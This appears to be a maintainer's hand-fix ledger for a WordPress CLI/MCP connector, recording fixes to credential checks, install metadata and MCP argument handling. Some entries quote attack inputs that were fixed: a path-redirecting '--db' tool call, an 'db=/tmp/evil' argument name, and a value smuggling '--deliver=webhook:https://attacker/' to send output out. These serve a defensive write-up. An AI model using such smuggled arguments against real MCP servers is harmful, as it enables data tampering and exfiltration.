_comment: Connector-specific edits to GENERATED/authored files that a cli-printing-press reprint must NOT clobber. check_handfixes.py asserts every marker below is still present (and banned anti-patterns absent) and fails CI if a reprint dropped one.

handfixes.summary: doctor probes a real GET endpoint with the real credential and refuses to dial a placeholder base_url, instead of calling any HTTP response 'reachable' and never checking the credential
handfixes.why: `doctor` is the command every SKILL, guide and docs page tells an operator to run to confirm the connector works, and it could not tell a working install from a broken one. It called any HTTP response to `GET /` "reachable" and rendered it green, so a base_url aimed at the vendor's web UI (where every API path 404s) and a token rejected with 401 on every call both produced an all-green report. On this connector family it also never probed the credential at all: it printed "present, not verified" and left the operator to guess. The mirror defect: a connector whose shipped base_url default is a placeholder dialled the placeholder host, and the DNS failure rendered as "FAIL API: unreachable" - telling a correctly-credentialled operator they were broken without naming the one variable that would fix it. Several placeholder hosts resolve through live wildcard DNS and answer real HTTP, so dialling one produced a confident green verdict against a stranger's server. Measured and gated by tools/maintainer/check_doctor_truth.py. See issue #282. 4.32.5 reprint (2026-09-28): doctor.go now emits doctorInfoKeys/doctorIsInfoKey natively (the hand copy in doctor_verdict.go was retired to avoid a duplicate symbol); the placeholder guard, the no-credential ERROR row and doctorProbeCredentials are still hand-carried - the press still prints 'present, not verified'.

handfixes.summary: every operator credential this connector reads is declared on all three install channels: manifest.json (.mcpb), server.json (MCP Registry) and mcp-install.md (manual install)
handfixes.why: Issue #282 ('three live-verified connectors prompt for the wrong credentials'). A connector is installed through THREE independent channels that each carry their own copy of the credential list: manifest.json server.mcp_config.env (what the .mcpb bundle hands Claude Desktop, which has no shell profile, no config.toml and no export - so an undeclared variable is a variable nobody is ever asked for), server.json environmentVariables (the MCP Registry publish channel), and mcp-install.md's copy-paste JSON blocks plus its remote launch line (the manual path, which never touches the bundle at all). The fleet-wide audit found 60 of 65 connectors under-declaring 122 operator-facing variables in the manifest, 61 of 65 mcp-install.md pages omitting 125, and hudu's server.json missing the base URL its manifest marks required. For wordpress the manifest gained: WORDPRESS_BASE_URL. server.json gained: WORDPRESS_BASE_URL. mcp-install.md's env blocks gained: WORDPRESS_BASE_URL. manifest.json, server.json and mcp-install.md are ALL regenerated by /msp-skills-publish on an UPDATE or re-onboard, so without this ledger a regeneration silently drops every declaration and CI stays green (check_env_schema.py is wired --warn). The asserts below name the specific credentials, not a count, so dropping one and adding another cannot cancel out. Reprint 4.32.5 (2026-09-28): the press now also reads WORDPRESS_MCP_HTTP_TOKEN (bearer token for --transport http) and PRINTING_PRESS_CLIENT_PROFILE (tenant-gated client profile binding); both are declared as optional prompts on all three channels the way datagate and zammad declare them, and check_env_schema.py is what noticed. 4.32.5 config.go reads WORDPRESS_BASE_URL through cliutil.EnvOverride, a cross-package call check_env_schema.py cannot resolve; see base-url-read-visible-to-env-schema for the literal-read spelling that keeps the gate honest, while these asserts keep it declared. WORDPRESS_USER_AGENT (optional User-Agent override, read through cliutil.EnvOverride in client.go and deliver.go) is declared as an optional prompt on all three channels too, the way auvik declares AUVIK_USER_AGENT; the #339 check_env_schema resolver is what surfaced it.
handfixes.spec_encode_followup: cli-printing-press should emit server.mcp_config.env, the matching user_config prompts, server.json environmentVariables and mcp-install.md's env blocks from ONE declaration of the connector's operator-facing environment, so the three channels cannot be generated out of step. Until then check_env_schema.py compares all three and this ledger pins them.

handfixes.summary: The MCP shell-out layer refuses filesystem-destination flags (--db, --input, --output, --out, --home, --audit-dir, --receipt-file and friends) and any argument name carrying '=', so a tool call cannot point the local SQLite store, or any other file this account can reach, at a path of its choosing
handfixes.why: The MCP server runs the companion CLI as the server account and forwarded every command-local flag straight through as a CLI argument. `sync` and the other local-store commands expose --db, and the store's migration runs `DROP TABLE IF EXISTS resources_fts` plus a resources-table rebuild against whatever file it is handed, so one tool call shaped {"db": "/path/to/someone-elses.sqlite"} rewrote an unrelated database - no credentials required, because sync opens the store before it ever reaches the API. Proven end to end: against the pre-fix binary a single MCP tools/call on `sync` changed the victim file's sha and left resources_fts with 0 rows; against the patched binary the same call returns the same sync summary and the victim file is byte-identical. The gate has three parts, all in cli/internal/mcp/cobratree/shellout.go: blockedDestinationFlags (the runtime name floor, unioned into cliArgsFromMCP alongside the pre-existing blockedRootFlags behaviour, which is unchanged); an argument-name '=' guard, because "db=/tmp/evil" was emitted as --db=/tmp/evil and a name-only denylist never saw it; and isFilesystemPathFlag, which classifies a flag by its USAGE TEXT rather than its NAME. The usage-text test is load bearing and must not be turned into a name rule: the generated command surface carries API body fields called --path, --seed-path, --source-paths, --exclude-paths, --filename and --working-dir whose values go to the vendor API and never touch this account's disk, so a name rule would break real API surfaces while still missing the next generated flag that does take a local path. UnblockedFilesystemPathFlags applies that rule to the live Cobra tree over exactly the command set RegisterAll turns into shell-out tools (endpoint and framework commands are out of scope, which is what keeps the rule off generated vendor body fields), and TestNoShellOutToolCanDirectAFilesystemPath fails the build when a regeneration grows a local-path flag the floor does not name. vendorAPIPathFlags is the documented exception list for flags whose usage trips the rule but which name a location in the vendor's world. Both directions are pinned by the tests: the --db argument must be dropped AND an ordinary flag must still be forwarded, because a gate that swallows the real MCP surface is as harmful as one that misses the defect. 4.32.5 reprint (2026-09-28): the press now emits blockedDestinationFlags (5 names: audit-dir, db, o, output, receipt-file), the argument-name '=' guard, and the 4.30 schema shape (blockedStructuredArgsForCommand removes blocked flags from the tool input schema) natively - residual (1) below is closed. Still hand-carried: the 13-name floor (adds from-csv, home, input, notes-file, out, playbook-file, playbook-notes-file, reconcile), filesystemPathFlagPhrases / isFilesystemPathFlag / vendorAPIPathFlags / UnblockedFilesystemPathFlags, the explicit union in cliArgsFromMCP, and both test files. TestNoShellOutToolCanDirectAFilesystemPath passes against the 4.32.5 tree, which added teach/recall/learnings/playbook/api commands.
handfixes.spec_encode_followup: Press-side: the gate belongs in the generator. Two known residuals a reprint should close rather than re-inherit. (1) On the pre-4.30 cobratree the blocked flags are dropped at forward time but still appear in the tool's input schema, because toolOptionsForFlags in typemap.go advertises every flag; the caller gets silence instead of an error. The 4.30 shape (blockedStructuredArgsForCommand + allowedStructuredArgsForCommand) removes them from the schema and errors on them, which is the better behaviour. (2) isFilesystemPathFlag is only consulted by the package test here, not at request time, because the pre-4.30 shellOutToCLI receives no *cobra.Command; wiring it into the per-command blocked set (as skills/servosity does) makes a newly generated path flag refused at runtime rather than at CI time.

handfixes.summary: the credentials-precedence tests decode the Basic Authorization header before asserting which secret it carries, instead of grepping the raw secret out of base64
handfixes.why: The generated credentials-precedence tests (credentials file beats legacy config, corrupt credentials fall back to legacy, corrupt falls back to env, an empty credentials file does not clear legacy) were emitted in a bearer-style shape: they assert the RAW secret appears in cfg.AuthHeader(). This connector authenticates with HTTP Basic, so AuthHeader() returns "Basic " + base64("<credential>:") and the substring check can never match - all four tests failed from the day the connector landed even though the precedence chain is correct. The two wrong resolutions are deleting the assertions and t.Skip-ing the tests (what resourceguru did, which drops the precedence coverage entirely); the right one is to decode the header and assert on the credential payload, which is strictly stronger than the original because it also names the payload in the failure message. A reprint re-emits the bearer-shaped test file and re-breaks it. Re-applied on the 4.32.5 reprint (2026-09-28): the press still emits the bearer-shaped substring asserts (4 tests born red), and its precedence contract changed - TestConfigFileWinsWhenCredentialsFileAlsoHasSecrets now expects the config-file value to beat the credentials file - so the marker assert names legacy-secret as the winner and data-secret as the loser.
handfixes.spec_encode_followup: Make the press emit scheme-aware credential-precedence tests (decode Basic before asserting) so Basic-auth connectors are not born red. Until then this recurs on every reprint.

handfixes.summary: cliArgsFromMCP emitted every tool-call value as its OWN argv element after its flag (--json <value>). Every value-carrying branch (string, float64, []any, default) now joins the value to the flag as one element (--json=<value>); bool true stays a bare --flag and the empty-string skip is unchanged.
handfixes.why: blockedRootFlags and blockedDestinationFlags filter KEYS only. A Cobra bool flag has NoOptDefVal and does not consume the token after it, so a tool-call VALUE that begins with '--' was parsed by pflag as its own flag: {"json": "--deliver=webhook:https://attacker/"} became argv `--json --deliver=webhook:...` and the denylisted --deliver took effect. Proven end to end on the real hudu-mcp binary (this same generated shellout.go) during the PR #317 review: a local webhook received 4,797 bytes of `doctor --json` output. Reported privately per SECURITY.md on 2026-09-09 as affecting the whole fleet (six connectors spot-checked by the reporter); this is the fleet backport of datagate commit 4075043e. Joined, pflag rejects the value outright on a bool flag (strconv.ParseBool) and contains it as the literal value on a string flag, so no value can ever reach a second flag. Fixed upstream in cli-printing-press main at be378adf (#4647, closes #4643, 2026-09-09) with the identical four lines, but NOT yet in a tagged press release (latest 4.32.1), so a reprint from any press at or below 4.32.1 REINTRODUCES the defect while go build and go test stay green; this entry is what notices. Reprinted on press 4.32.5 (2026-09-28), which carries #4647: shellout.go now emits the four joined lines natively and ships its own TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag, so status is upstreamed. The nested-object (default branch) case the press test does not pin lives in the hand-authored cobratree/shellout_handfix_test.go, which regen-merge keeps whole. code_only because the explanatory comment above the loop describes the joined form - the assert must be satisfied by the emission lines themselves. shellout_test.go (TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag) proves both directions: the split argv sets --deliver, the joined argv cannot.

handfixes.summary: the hand-authored `media upload` novel command (multipart POST /media, which the generated JSON-body client cannot do) is registered in media.go, and the media group's description names upload
handfixes.why: media_upload.go is a whole hand-authored file regen-merge keeps, but its AddCommand line lives in generated media.go and the media group Short comes from the spec's resource description. The 4.26.1 library copy carried an unrecorded hand-edit of that Short ('Upload, list, ...') while spec.yaml still said 'upload is a documented gap - multipart', so the 4.32.5 reprint regenerated the gap wording into the CLI, SKILL.md and guide.md. Fixed at layer 1: the library spec.yaml media description now names upload, so any press regenerates it; the AddCommand line and the `media upload` rows in SKILL.md/guide.md (spec-driven docs cannot know a novel command) are re-applied by hand on every reprint.
handfixes.spec_encode_followup: spec.yaml media.description already carries the wording; a press-side hook to register hand-authored novel commands from research.json novel_features would retire the AddCommand re-apply.

asserts.contains: Upload, list, read, update, and delete media library items

handfixes.summary: the MCP server's streamable-HTTP transport sets http.Server.ReadHeaderTimeout so a slow client cannot hold a connection open indefinitely
handfixes.why: printing-press 4.32.5 added a bearer-gated HTTP transport to cmd/<slug>-mcp/main.go but emits the http.Server literal without ReadHeaderTimeout; gosec G112 (Slowloris) is a P1 in check_security_gate.py and the fleet policy only waives G112 for the ephemeral loopback OAuth callback listener in auth.go, not for a long-running network-facing MCP server. A 10s header read bound is the standard cure and changes nothing for well-behaved clients. Press-side follow-up: emit ReadHeaderTimeout in the mcp main template so every 4.32.5+ reprint stops needing this hand-edit.
handfixes.spec_encode_followup: cli-printing-press mcp main.go template: add ReadHeaderTimeout to the streamable-HTTP http.Server literal.

handfixes.summary: under an explicit --config / WORDPRESS_CONFIG file, auth set-token saves to and auth logout clears the same sibling data/credentials.toml that Load reads first
handfixes.why: printing-press 4.32.5 made Load read the explicit config's sibling data/credentials.toml (CredentialsFilePathForConfig) before the global credentials file, but left saveCredentialsFirst/saveCredentialsThenConfig on cliutil.SaveCredentials and ClearTokens on cliutil.RemoveCredentials, both of which only touch the global file. So with a sibling store present, `--config X auth set-token` wrote the global file while the next Load kept returning the stale sibling token, and `--config X auth logout` left the sibling token active. Found by the Codex review of the 4.32.5 reprint (P1). The fix gives Config one credentials path (credentialsFile, set in Load from CredentialsFilePathForConfig when the config is explicit), adds cliutil.SaveCredentialsTo / RemoveCredentialsAt, saves and locks against that path, and on logout removes the global file (the pre-4.32 behaviour) plus the sibling. explicit_credentials_test.go proves both directions: it fails against the unpatched tree (Load returns stale-token after set-token) and passes with the fix; the default-config test pins that a non-explicit config still uses the global file. Codex round 2 found the symlink case: save() atomically replaced a symlinked config with a regular file, which moved the resolved sibling on the next Load and stranded the saved token; configWritePath now writes an explicit config through its symlink (the link is kept), pinned by TestSymlinkedExplicitConfigKeepsOneCredentialsFileAcrossSave, which fails with the link-replacing write.
handfixes.spec_encode_followup: cli-printing-press config template: resolve the credentials path once in Load and use it for load, save and clear (the press already has CredentialsFilePathForConfig for load).

handfixes.summary: the MCP search/sql tools open the local store through the CLI's credential-scoped resolver (data-<hash>.db, legacy data.db kept) instead of a hard-coded data.db
handfixes.why: printing-press 4.32.5 scopes the CLI's default store per credential: sync writes data-<sha256(credential)[:12]>.db unless a legacy unscoped data.db already exists. The generated MCP mcpDBPath still hard-codes data.db, so on a fresh install a successful sync (through the MCP sync shell-out or the CLI) was followed by MCP search/sql reporting that no local data store exists. Found by the Codex review of the datto-bcdr 4.32.5 reprint pilot and confirmed present in this tree (same generated tools.go). The fix adds cli.MCPStoreDBPath (hand-authored internal/cli/mcp_store_path.go), which runs configureDefaultDBScope and defaultDBPathInDir exactly as the CLI does, and points mcpDBPath at it. store_path_test.go fails against the unpatched mcpDBPath (fresh install resolves data.db) and passes with the fix; a second test pins that an existing legacy data.db is still used.
handfixes.spec_encode_followup: cli-printing-press mcp tools template: resolve mcpDBPath through the same scoped resolver the CLI's defaultDBPath uses.

handfixes.summary: mcp-install.md's remote launch line, and the ChatGPT FAQ in README.md and page.json, set WORDPRESS_MCP_HTTP_TOKEN and rely on the loopback default bind instead of --addr :7777, and say callers must send Authorization: Bearer
handfixes.why: printing-press 4.32.5's wordpress-mcp --transport http refuses to start without WORDPRESS_MCP_HTTP_TOKEN and refuses a plaintext bind on any non-loopback address (':7777' binds every interface). The generated remote-agents section still printed `wordpress-mcp --transport http --addr :7777` with no token, which exits 1 on both checks (reproduced against the built binary: 'WORDPRESS_MCP_HTTP_TOKEN must be set' and 'non-loopback --addr ":7777" requires --tls-cert and --tls-key'); with no --addr the 4.32.5 server binds its default 127.0.0.1:7777 and serves, so the corrected line simply drops --addr. The README / page.json ChatGPT FAQ answer carried the same broken command and is corrected the same way. mcp-install.md is regenerated by /msp-skills-publish on every UPDATE, so without this entry the next re-onboard reprints the line that cannot launch.
handfixes.spec_encode_followup: msp-skills-publish onboard.py (and the press mcp-install template): emit the loopback bind, the MCP HTTP token variable and the Bearer note for 4.32+ connectors.

handfixes.summary: config.go reads WORDPRESS_BASE_URL as cliutil.EffectiveEnv(os.Getenv("WORDPRESS_BASE_URL")) instead of cliutil.EnvOverride("WORDPRESS_BASE_URL"), so check_env_schema.py sees the read
handfixes.why: printing-press 4.32.5 emits the base-URL override as cliutil.EnvOverride("WORDPRESS_BASE_URL"). check_env_schema.py promotes name-as-parameter helpers only within their own package, so a call to cliutil.EnvOverride from internal/config is invisible to it; WORDPRESS_BASIC_AUTH survives only because doctor.go also reads it with a literal os.Getenv. The gate therefore reported WORDPRESS_BASE_URL as 'declared in manifest.json but NO source file reads it' and CI failed, while the connector cannot work without it (WordPress is per-site, and the shipped default is wordpress.org/news). EnvOverride(name) is defined as EffectiveEnv(os.Getenv(name)), so the rewritten line is behaviour-identical; zammad's tree already carries the same spelling. Retire this entry when check_env_schema.py resolves cross-package helper calls (then the generated EnvOverride form passes on its own).
handfixes.spec_encode_followup: tools/maintainer/check_env_schema.py: promote name-as-parameter helpers across packages and scan qualified calls (cliutil.EnvOverride("X")). That fixes every 4.32.5 reprint at once and retires this entry.

handfixes.summary: doctor verifies the credential against /users/me (auth-required) instead of the first argument-free GET the tree walk finds (/categories, a public route)
handfixes.why: The doctor-verdict-tracks-reality probe walks the command tree for the first argument-free GET. On WordPress that is /categories, which answers 200 to an anonymous request, so when the web server strips the Authorization header (the most common Application Password failure: Apache/CGI and some hosts drop it) doctor reported the credential 'valid' while every write would fail. /users/me answers 401 rest_not_logged_in unless the request authenticated, so a 200 there proves the credential was accepted. Found by the Codex review of the 4.32.5 reprint (P1, inherited from the 4.26.1 hand-fix, not introduced by the reprint). doctor_auth_probe_test.go uses a server that ignores Authorization: it fails with the override removed (doctor says valid) and passes with it; its twin pins that an honoured credential still reads valid. Codex round 3 (P2, cured): a site can unregister /users/me while serving everything else, so a 404 there re-probes the tree-walk route and reports WARN not-verified when that answers, keeping the wrong-base_url ERROR for the case where both routes 404 (TestDoctorDisabledUsersEndpointIsNotAWrongBaseURL, TestDoctorWrongBaseURLStillReported).
handfixes.spec_encode_followup: Let the spec name an auth-required probe endpoint (e.g. x-doctor-probe: /users/me) so the generated doctor does not have to guess from the tree walk.

handfixes.summary: the Windows token-file guard compares trustees by SID, resolving SDDL aliases through the OS, so the built-in Administrator (RID 500, rendered as LA) can save and load credentials
handfixes.why: Press 4.30.2+ creds_perms_eval.go compared the SDDL text of the token file's owner and ACE trustees against the process's SID string. The SDDL converter renders the built-in local Administrator (RID 500) as the alias LA, so that account's own ACE never matched: `auth set-token` exited 1 with `token file DACL grants access to a non-owner principal (LA)` and every read refused the file. Reproduced 2026-10-15 on the published fortinet-cli 0.1.0, installed with the README one-liner on a windows-latest runner (whoami S-1-5-21-...-500). The fix resolves each trustee to its SID (fixed aliases from a table, machine-relative ones like LA through ConvertStringSidToSid, kept only when the converter renders that SID back to the same alias) and compares SIDs. The allow-list is unchanged (current user, BUILTIN\Administrators, SYSTEM); any other principal, a broad group, or an unresolvable trustee is still refused. A reprint from an unfixed press silently restores the string compare while unit tests stay green on every non-Windows host.
handfixes.spec_encode_followup: Press defect in internal/generator/templates/cliutil_creds_perms_eval.go.tmpl and cliutil_creds_perms_windows.go.tmpl (unfixed on press main as of 4.33.5). Upstream report: mvanhorn/cli-printing-press (link added once filed).

asserts.contains: func trusteeSID(trustee string, resolveAlias sddlAliasResolver) string {
